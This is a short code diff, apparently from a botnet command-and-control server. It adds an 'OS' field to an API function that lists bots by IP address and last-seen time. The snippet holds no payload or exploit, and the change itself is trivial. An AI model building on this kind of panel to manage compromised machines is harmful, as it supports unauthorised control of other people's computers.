@@ -44,6 +44,7 @@ def api_clients():
     for bot in bots:
         data[bot.id] = dict()
         data[bot.id]["IP"] = bot.ip
+        data[bot.id]["OS"] = bot.os
         data[bot.id]["last_seen"] = bot.last_seen
     return json.dumps(data)
 
